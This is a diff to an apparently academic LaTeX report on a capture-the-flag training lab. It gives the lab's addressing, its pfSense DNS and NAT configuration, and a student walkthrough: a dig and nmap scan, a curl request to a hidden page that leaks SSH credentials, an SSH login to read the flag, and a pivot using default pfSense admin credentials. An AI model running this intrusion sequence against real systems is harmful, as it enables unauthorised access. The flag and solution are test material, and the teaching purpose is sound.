@@ -62,6 +62,31 @@ nginx~\cite{nginx} web server and is the primary target of the lab. The \textbf{
 (Ubuntu Desktop 24.04) represents an internal workstation and is reserved for
 future lab extensions.
 
+\subsubsection{Network Addressing}
+
+Table~\ref{tab:lab1-addressing} summarises the IP addressing scheme used across all
+nodes and interfaces.
+
+\begin{table}[h]
+\centering
+\caption{Lab 1 — IP addressing table}
+\label{tab:lab1-addressing}
+\begin{tabular}{@{}llll@{}}
+\toprule
+\textbf{Node} & \textbf{Interface} & \textbf{IP Address} & \textbf{Role} \\
+\midrule
+pfSense & vtnet1 (WAN) & 192.168.0.29/24 & Student entry point \\
+pfSense & vtnet0 (LAN) & 172.16.0.1/30   & Transit link to VyOS \\
+VyOS    & eth0         & 172.16.0.2/30   & Link to pfSense \\
+VyOS    & eth6         & 192.168.10.5/24 & Users LAN gateway \\
+VyOS    & eth7         & 192.168.20.1/24 & Servers LAN gateway \\
+Server (pebcak) & ens3 & 192.168.20.50/24 & Target — web + SSH \\
+PC1     & ens3         & 192.168.10.50/24 & Internal workstation \\
+Attacker (Parrot) & pnet0 & DHCP / 192.168.0.x & Pentesting node \\
+\bottomrule
+\end{tabular}
+\end{table}
+
 
 \subsection{Infrastructure Design Decisions}
 
@@ -83,6 +108,35 @@ Instead, the pfSense DNS Resolver~\cite{pfsense} is configured to resolve a cust
 (\texttt{lab1}) to the firewall's WAN address. This introduces students to the
 role of DNS in reconnaissance and reflects real-world scenarios where targets are
 identified by name rather than by address.
+
+The Unbound~\cite{unbound_dns} custom options stored in pfSense are:
+
+\begin{lstlisting}[language=bash, caption={pfSense Unbound custom options for lab1 hostname}]
+interface: 192.168.0.29
+access-control: 192.168.0.0/24 allow
+local-zone: "lab1." redirect
+local-data: "lab1. A 192.168.0.29"
+\end{lstlisting}
+
+\subsubsection{NAT Port Forwarding}
+
+The pfSense firewall exposes three services from the internal server to the external
+segment via static port-forward rules, as shown in Table~\ref{tab:lab1-nat}.
+
+\begin{table}[h]
+\centering
+\caption{Lab 1 — pfSense NAT port-forward rules (WAN $\rightarrow$ Server)}
+\label{tab:lab1-nat}
+\begin{tabular}{@{}llll@{}}
+\toprule
+\textbf{Protocol} & \textbf{WAN port} & \textbf{Target} & \textbf{Service} \\
+\midrule
+TCP & 80  & 192.168.20.50:80  & HTTP — nginx web server \\
+TCP & 443 & 192.168.20.50:443 & HTTPS — nginx web server \\
+TCP & 22  & 192.168.20.50:22  & SSH — target system access \\
+\bottomrule
+\end{tabular}
+\end{table}
 
 \subsubsection{CTF-Style Progression}
 
@@ -119,23 +173,100 @@ explore beyond the primary objective.
 \subsection{Student Workflow}
 \label{subsec:lab1-workflow}
 
-The intended progression through the lab is as follows:
+The intended progression through the lab is as follows.
 
-\begin{enumerate}
-    \item \textbf{DNS resolution.} The student resolves the \texttt{lab1} hostname
-          using the lab's DNS server, confirming network reachability and identifying
-          the entry point.
-    \item \textbf{Service enumeration.} A port scan reveals HTTP (port~80) and SSH
-          (port~22) open on the target address, both forwarded by the pfSense
-          firewall to the internal server.
-    \item \textbf{Web content discovery.} Browsing to \texttt{http://lab1} presents
-          the PEBCAK Corp index page. Inspecting the HTML source reveals a comment
-          hinting at a hidden path.
-    \item \textbf{Credential retrieval.} Navigating to the hidden page exposes SSH
-          credentials for the target server.
-    \item \textbf{SSH access and flag capture.} The student connects via SSH using
-          the discovered credentials and locates the flag file in the home directory.
-\end{enumerate}
+\subsubsection{Step 1 --- DNS Resolution}
+
+The student configures the attacker node to use the pfSense Unbound resolver and
+verifies that the \texttt{lab1} hostname resolves correctly:
+
+\begin{lstlisting}[language=bash, caption={DNS resolution of the lab1 hostname}]
+$ dig lab1 @192.168.0.29
+
+;; ANSWER SECTION:
+lab1.                   0       IN      A       192.168.0.29
+
+$ resolvectl query lab1
+lab1: 192.168.0.29
+\end{lstlisting}
+
+\subsubsection{Step 2 --- Service Enumeration}
+
+A version and script scan against the resolved address reveals the exposed services:
+
+\begin{lstlisting}[language=bash, caption={nmap service enumeration of the lab1 target}]
+$ nmap -sV -sC -p 22,80,443 lab1
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 4ubuntu0.4
+80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+| http-title: PEBCAK Corp -- Internal Portal
+443/tcp closed https
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+\end{lstlisting}
+
+The results confirm HTTP and SSH are reachable through the firewall. HTTPS is closed,
+consistent with the nginx configuration on the server.
+
+\subsubsection{Step 3 --- Web Content Discovery}
+
+Browsing to \texttt{http://lab1} presents the PEBCAK Corp index page. Inspecting
+the HTML source reveals a comment hinting at a hidden path:
+
+\begin{lstlisting}[language=bash, caption={HTML source inspection of the index page}]
+$ curl -s http://lab1 | grep -i "comment\|<!--"
+
+<!-- TODO: remove /pebcak.html before going public - IT dept -->
+\end{lstlisting}
+
+\subsubsection{Step 4 --- Credential Retrieval}
+
+Navigating to the discovered path exposes SSH credentials:
+
+\begin{lstlisting}[language=bash, caption={Retrieving credentials from the hidden page}]
+$ curl -s http://lab1/pebcak.html
+
+<html>
+<body>
+  <h1>PEBCAK Corp -- Internal Maintenance</h1>
+  <p>SSH access for sysadmin team:</p>
+  <p>User: <b>pebcak</b> | Pass: <b>pebcak123</b></p>
+  <p>Host: lab1 (port 22)</p>
+</body>
+</html>
+\end{lstlisting}
+
+\subsubsection{Step 5 --- SSH Access and Flag Capture}
+
+Using the retrieved credentials, the student establishes an SSH session and locates
+the flag:
+
+\begin{lstlisting}[language=bash, caption={SSH login and flag retrieval}]
+$ ssh pebcak@lab1
+
+pebcak@pebcak:~$ ls
+flag.txt
+
+pebcak@pebcak:~$ cat flag.txt
+FLAG{p3bc4k_s3rv3r_0wn3d}
+
+pfSense admin credentials (bonus): admin / pfsense
+\end{lstlisting}
+
+\subsubsection{Optional Extension --- Firewall Pivot}
+
+Students who wish to explore further can use the pfSense credentials found in the
+flag file to access the firewall management interface:
+
+\begin{lstlisting}[language=bash, caption={Accessing pfSense management via SSH (optional)}]
+$ ssh admin@172.16.0.1
+
+[2.7.2-RELEASE][admin@pfSense.home.arpa]/root:
+\end{lstlisting}
+
+This demonstrates the cascading impact of credential exposure: a single misconfigured
+web page leads to full administrative access over the network perimeter.
 
 
 \subsection{Persistent Environment Configuration}
@@ -198,3 +329,74 @@ references \texttt{/usr/local/etc/unbound/unbound.conf} by default, while pfSens
 generates its runtime configuration at \texttt{/var/unbound/unbound.conf}. The
 correct approach is to trigger a restart through pfSense's own PHP service management
 functions, which regenerate the configuration file before starting the process.
+
+\subsubsection{VyOS Source NAT Requirement}
+
+Initial tests showed that HTTP responses from the server were reaching the attacker
+but connection resets occurred intermittently. The root cause was asymmetric routing:
+reply packets from the server (192.168.20.50) were routed through VyOS back to
+pfSense with source address 192.168.20.50, but pfSense's state table expected
+replies to arrive on the LAN interface from the transit subnet. Adding a Source NAT
+rule on VyOS to masquerade traffic leaving the external-facing interface resolved the
+asymmetry and stabilised all TCP connections.
+
+
+\subsection{Results and Conclusions}
+
+\subsubsection{Flags Obtained}
+
+\begin{table}[h]
+\centering
+\caption{Lab 1 — captured flags}
+\label{tab:lab1-flags}
+\begin{tabular}{@{}lll@{}}
+\toprule
+\textbf{Flag} & \textbf{Value} & \textbf{Location} \\
+\midrule
+Primary flag   & \texttt{FLAG\{p3bc4k\_s3rv3r\_0wn3d\}} & \texttt{\textasciitilde/flag.txt} on server \\
+Bonus access   & pfSense admin credentials & Embedded in flag file \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsubsection{Vulnerabilities Demonstrated}
+
+The lab successfully demonstrates several categories of security weakness that appear
+regularly in real-world environments:
+
+\begin{itemize}
+    \item \textbf{Information disclosure via HTML comments.} The hidden path hint
+          embedded in the page source reflects a common development mistake where
+          internal notes are not removed before deployment.
+    \item \textbf{Credential exposure through unauthenticated web content.} The
+          \texttt{/pebcak.html} page exposes SSH credentials without any access
+          control, representing a misconfigured web server.
+    \item \textbf{Credential reuse and privilege escalation.} The same file contains
+          firewall admin credentials, illustrating how a single disclosure can
+          cascade into full infrastructure compromise.
+    \item \textbf{Insufficient network segmentation.} Although pfSense and VyOS
+          provide logical separation, the NAT rules grant unrestricted access to
+          the server's SSH port from any external address.
+\end{itemize}
+
+\subsubsection{Lessons Learned}
+
+The design and implementation of Lab~1 produced several insights relevant to both
+the pedagogical and technical aspects of the project:
+
+\begin{itemize}
+    \item \textbf{Sequential discovery reinforces methodology.} Structuring the lab
+          as a linear chain --- DNS, scan, web, credentials, SSH --- gives students
+          a concrete experience of how individual findings build into a full
+          exploitation path, which abstract descriptions of the kill chain cannot
+          replicate.
+    \item \textbf{EVE-NG VNC automation requires low-level implementation.} The
+          failure of high-level VNC tools with QEMU nodes necessitated direct
+          protocol implementation, which became a reusable component for all
+          subsequent lab automation.
+    \item \textbf{pfSense configuration internals are non-obvious.} The Base64
+          encoding of Unbound custom options, the PHP-managed service lifecycle,
+          and the post-NAT firewall rule semantics are not documented in the main
+          pfSense guides and required direct inspection of the configuration files
+          to resolve.
+\end{itemize}
